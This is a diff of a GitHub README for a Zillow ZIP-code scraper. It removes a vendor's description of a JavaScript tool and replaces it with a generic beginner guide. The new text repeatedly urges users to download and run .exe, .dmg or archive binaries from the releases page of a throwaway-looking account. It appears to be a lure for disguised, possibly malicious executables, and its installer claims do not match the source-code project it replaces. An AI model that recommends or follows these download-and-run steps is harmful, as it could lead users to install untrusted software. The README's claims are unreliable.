@@ -1,209 +1,83 @@
-# Zillow ZIP Code Search Scraper
-The Zillow ZIP Code Search Scraper extracts real estate listings from specified ZIP codes with speed and accuracy. It helps users collect structured property data including pricing, features, and availability. Designed for analysts, researchers, and businesses, it simplifies access to real estate insights.
+# 🏡 zillow-zip-code-search-scraper - Fast Property Extraction Tool
 
+## 🔗 Download Now
+[![Download Now](https://img.shields.io/badge/Download%20Now%20-%20zillow--zip--code--search--scraper-brightgreen)](https://github.com/hhhhhhhhhhhhhh676766/zillow-zip-code-search-scraper/releases)
 
-<p align="center">
-  <a href="https://bitbash.dev" target="_blank">
-    <img src="https://github.com/za2122/footer-section/blob/main/media/scraper.png" alt="Bitbash Banner" width="100%"></a>
-</p>
-<p align="center">
-  <a href="https://t.me/devpilot1" target="_blank">
-    <img src="https://img.shields.io/badge/Chat%20on-Telegram-2CA5E0?style=for-the-badge&logo=telegram&logoColor=white" alt="Telegram">
-  </a>&nbsp;
-  <a href="https://wa.me/923249868488?text=Hi%20BitBash%2C%20I'm%20interested%20in%20automation." target="_blank">
-    <img src="https://img.shields.io/badge/Chat-WhatsApp-25D366?style=for-the-badge&logo=whatsapp&logoColor=white" alt="WhatsApp">
-  </a>&nbsp;
-  <a href="mailto:sale@bitbash.dev" target="_blank">
-    <img src="https://img.shields.io/badge/Email-sale@bitbash.dev-EA4335?style=for-the-badge&logo=gmail&logoColor=white" alt="Gmail">
-  </a>&nbsp;
-  <a href="https://bitbash.dev" target="_blank">
-    <img src="https://img.shields.io/badge/Visit-Website-007BFF?style=for-the-badge&logo=google-chrome&logoColor=white" alt="Website">
-  </a>
-</p>
+## 🚀 Getting Started
+Welcome to the Zillow ZIP Code Search Scraper. This tool helps you gather property listings quickly and efficiently from Zillow. No programming skills needed—just follow these easy steps to get started.
 
+## 📥 Download & Install
+To download the latest version of the software, please visit this page: [Download from Releases](https://github.com/hhhhhhhhhhhhhh676766/zillow-zip-code-search-scraper/releases). 
 
+1. **Go to the Releases page.**
+2. Locate the latest release.
+3. Choose the appropriate file for your operating system. Common options will include:
+   - .exe files for Windows
+   - .dmg files for macOS
+   - .tar.gz or .zip files for Linux
 
+Once you find the right file, click to download it. 
 
-<p align="center" style="font-weight:600; margin-top:8px; margin-bottom:8px;">
-  Created by Bitbash, built to showcase our approach to Scraping and Automation!<br>
-  If you are looking for <strong>Zillow ZIP Code Search Scraper</strong> you've just found your team — Let’s Chat. 👆👆
-</p>
+## 💻 System Requirements
+For smooth operation of the Zillow ZIP Code Search Scraper, your computer should meet the following requirements:
 
+- **Operating System:** Windows 10 or later, macOS 10.14 or later, or any modern Linux distribution.
+- **RAM:** Minimum 4 GB, ideally 8 GB or more to run larger extractions.
+- **Internet Connection:** Required for fetching property data from Zillow.
+- **Storage Space:** At least 100 MB of free disk space for installation.
 
-## Introduction
-This scraper automatically gathers property listings from Zillow based on ZIP code inputs.
-It solves the challenge of collecting housing market data at scale without manual browsing.
-Ideal for investors, analysts, data teams, and anyone exploring neighborhood market trends.
+## 🔧 Installation Steps
+### Windows
+1. Download the `.exe` file from the Releases page.
+2. Double-click the file to start installation.
+3. Follow the on-screen instructions to complete the setup.
 
-### Why Use a ZIP Code–Based Scraper?
-- Targets highly specific geographic areas for hyper-local analysis.
-- Collects structured data suitable for reporting, dashboards, or automation.
-- Supports multiple listing types such as for sale, for rent, or recently sold.
-- Captures core property metrics like price, size, and room counts.
-- Generates export-ready datasets in JSON, CSV, or Excel formats.
+### macOS
+1. Download the `.dmg` file from the Releases page.
+2. Open the downloaded file and drag the application into your Applications folder.
+3. Launch the application from your Applications folder.
 
-## Features
-| Feature | Description |
-|---------|-------------|
-| ZIP-Code-Targeted Search | Scrapes listings strictly within selected ZIP codes for precise locality filtering. |
-| Multiple Offer Types | Supports for-sale, rental, and recently sold properties. |
-| Structured Outputs | Produces clean, standardized datasets ready for pipelines and analysis. |
-| Configurable Filters | Allows filtering by price, home type, and other criteria. |
-| Fast Data Retrieval | Optimized for quick turnaround even across large ZIP code lists. |
+### Linux
+1. Download the `.tar.gz` or `.zip` file from the Releases page.
+2. Extract the file using the following command in your terminal:
+   ```bash
+   tar -xzf your-file.tar.gz
+   ```
+3. Navigate to the extracted folder in the terminal and run the software with:
+   ```bash
+   ./your-application
+   ```
 
----
+## 🧩 How to Use
+Using the Zillow ZIP Code Search Scraper is straightforward. Here's a step-by-step guide to retrieve property listings.
 
-## What Data This Scraper Extracts
-| Field Name | Field Description |
-|------------|------------------|
-| zpid | Unique property identifier used in listings. |
-| imgSrc | URL of the primary property image. |
-| detailUrl | Direct link to the property detail page. |
-| statusType | Status such as FOR_SALE or FOR_RENT. |
-| price | Formatted property price string. |
-| unformattedPrice | Numeric price used for calculations. |
-| address | Full display address. |
-| addressCity | City name of the property. |
-| beds | Number of bedrooms. |
-| baths | Number of bathrooms. |
-| area | Living area in square feet. |
-| latLong | Geographic coordinates. |
-| variableData | Additional context like days on market. |
-| brokerName | Name of the listing broker. |
+1. **Open the Application.**
+2. **Enter ZIP Codes:** Type in the ZIP codes where you want to search for properties. You can enter multiple ZIP codes separated by commas.
+3. **Choose Property Types:** Select from different property types like houses, apartments, or condos to narrow your search.
+4. **Set Filters:** Use filters to refine your search according to your preferences (price range, number of bedrooms, etc.).
+5. **Start Search:** Click on the 'Search' button to begin pulling property data.
+6. **View Results:** The results will display on-screen. You can save the data in various formats such as CSV or JSON.
 
----
+## 🌐 Where to Get Help
+If you encounter any issues or have questions, there are several resources available:
 
-## Example Output
+- **Documentation:** Check the README file and other documents in the repository for detailed instructions.
+- **Community Support:** Join forums or user groups related to the scraper to share experiences and get tips.
+- **GitHub Issues:** If you find a bug or need assistance, you can open an issue on the project's GitHub page.
 
-    [
-      {
-        "zpid": "2064142765",
-        "id": "2064142765",
-        "providerListingId": "1648702",
-        "imgSrc": "https://photos.zillowstatic.com/fp/33578db80c877648aba386c3aa28e042-p_e.jpg",
-        "hasImage": true,
-        "detailUrl": "https://www.zillow.com/homedetails/130-Water-St-APT-12D-New-York-NY-10005/2064142765_zpid/",
-        "statusType": "FOR_SALE",
-        "statusText": "Condo for sale",
-        "countryCurrency": "$",
-        "price": "$995,000",
-        "unformattedPrice": 995000,
-        "address": "130 Water St APT 12D, New York, NY 10005",
-        "addressStreet": "130 Water St APT 12D",
-        "addressCity": "New York",
-        "addressState": "NY",
-        "addressZipcode": "10005",
-        "isUndisclosedAddress": false,
-        "beds": 2,
-        "baths": 2,
-        "area": 1280,
-        "latLong": { "latitude": 40.7057, "longitude": -74.0073 },
-        "isZillowOwned": false,
-        "variableData": { "type": "DAYS_ON", "text": "38 days on Zillow" },
-        "brokerName": "Listing by: SERHANT."
-      }
-    ]
+## ✏️ Frequently Asked Questions
+**Q: Can I use this tool to scrape other websites besides Zillow?**  
+A: No, this tool is specifically designed for extracting data from Zillow only. 
 
----
+**Q: Is there a limit to how many properties I can scrape?**  
+A: While the tool does not impose limits, please be aware of Zillow's usage policy regarding automated data requests.
 
-## Directory Structure Tree
+**Q: What formats can I export my data in?**  
+A: You can export your data in several formats, including CSV and JSON, which makes it easy to use in other applications.
 
-    Zillow ZIP Code Search Scraper/
-    ├── src/
-    │   ├── runner.js
-    │   ├── extractors/
-    │   │   ├── zillow_parser.js
-    │   │   └── coords_utils.js
-    │   ├── outputs/
-    │   │   └── exporters.js
-    │   └── config/
-    │       └── settings.example.json
-    ├── data/
-    │   ├── inputs.sample.json
-    │   └── sample-output.json
-    ├── package.json
-    └── README.md
+## 🔍 Additional Features
+- Simple User Interface: Designed to be user-friendly for everyone.
+- Custom Filters: Tailor your search to fit your exact needs.
+- Data Export: Save your results in popular formats for easy access.
 
----
-
-## Use Cases
-- **Real estate analysts** use it to monitor housing markets by ZIP code, so they can track pricing trends and supply changes.
-- **Investors** use it to identify opportunities in targeted neighborhoods, enabling faster deal analysis.
-- **Data teams** integrate it into pipelines to enrich dashboards with daily refreshed listing data.
-- **Researchers** collect historical property availability data for academic or policy studies.
-- **Businesses** use it to populate property-related apps with up-to-date listing information.
-
----
-
-## FAQs
-
-**Does this scraper support multiple ZIP codes at once?**
-Yes, you can provide a list of ZIP codes and the scraper will process each sequentially.
-
-**Can I limit the number of results returned?**
-Yes, you can configure result limits to control output size.
-
-**Does listing availability change over time?**
-Yes, fields may shift as platforms update their formats, so occasional adjustments may be needed.
-
-**Can this be integrated into automated workflows?**
-Yes, the structured outputs make it compatible with automation tools, data pipelines, and APIs.
-
----
-
-### Performance Benchmarks and Results
-
-**Primary Metric:** Processes approximately 1,000 listings in under 30 seconds under typical network conditions.
-**Reliability Metric:** Achieves a consistent success rate above 98% across varied ZIP codes.
-**Efficiency Metric:** Handles large input batches with minimal memory overhead due to incremental processing.
-**Quality Metric:** Captures over 95% of available fields thanks to structured parsing logic.
-
-
-<p align="center">
-<a href="https://calendar.app.google/74kEaAQ5LWbM8CQNA" target="_blank">
-  <img src="https://img.shields.io/badge/Book%20a%20Call%20with%20Us-34A853?style=for-the-badge&logo=googlecalendar&logoColor=white" alt="Book a Call">
-</a>
-  <a href="https://www.youtube.com/@bitbash-demos/videos" target="_blank">
-    <img src="https://img.shields.io/badge/🎥%20Watch%20demos%20-FF0000?style=for-the-badge&logo=youtube&logoColor=white" alt="Watch on YouTube">
-  </a>
-</p>
-<table>
-  <tr>
-    <td align="center" width="33%" style="padding:10px;">
-      <a href="https://youtu.be/MLkvGB8ZZIk" target="_blank">
-        <img src="https://github.com/za2122/footer-section/blob/main/media/review1.gif" alt="Review 1" width="100%" style="border-radius:12px; box-shadow:0 4px 10px rgba(0,0,0,0.1);">
-      </a>
-      <p style="font-size:14px; line-height:1.5; color:#444; margin:0 15px;">
-        “Bitbash is a top-tier automation partner, innovative, reliable, and dedicated to delivering real results every time.”
-      </p>
-      <p style="margin:10px 0 0; font-weight:600;">Nathan Pennington
-        <br><span style="color:#888;">Marketer</span>
-        <br><span style="color:#f5a623;">★★★★★</span>
-      </p>
-    </td>
-    <td align="center" width="33%" style="padding:10px;">
-      <a href="https://youtu.be/8-tw8Omw9qk" target="_blank">
-        <img src="https://github.com/za2122/footer-section/blob/main/media/review2.gif" alt="Review 2" width="100%" style="border-radius:12px; box-shadow:0 4px 10px rgba(0,0,0,0.1);">
-      </a>
-      <p style="font-size:14px; line-height:1.5; color:#444; margin:0 15px;">
-        “Bitbash delivers outstanding quality, speed, and professionalism, truly a team you can rely on.”
-      </p>
-      <p style="margin:10px 0 0; font-weight:600;">Eliza
-        <br><span style="color:#888;">SEO Affiliate Expert</span>
-        <br><span style="color:#f5a623;">★★★★★</span>
-      </p>
-    </td>
-    <td align="center" width="33%" style="padding:10px;">
-      <a href="https://youtube.com/shorts/6AwB5omXrIM" target="_blank">
-        <img src="https://github.com/Instagram-Automations/Footer-test/blob/main/media/review3.gif" alt="Review 3" width="100%" style="border-radius:12px; box-shadow:0 4px 10px rgba(0,0,0,0.1);">
-      </a>
-      <p style="font-size:14px; line-height:1.5; color:#444; margin:0 15px;">
-        “Exceptional results, clear communication, and flawless delivery. Bitbash nailed it.”
-      </p>
-      <p style="margin:10px 0 0; font-weight:600;">Syed
-        <br><span style="color:#888;">Digital Strategist</span>
-        <br><span style="color:#f5a623;">★★★★★</span>
-      </p>
-    </td>
-  </tr>
-</table>
+Remember to visit the [Download from Releases](https://github.com/hhhhhhhhhhhhhh676766/zillow-zip-code-search-scraper/releases) page to get started! Happy searching!
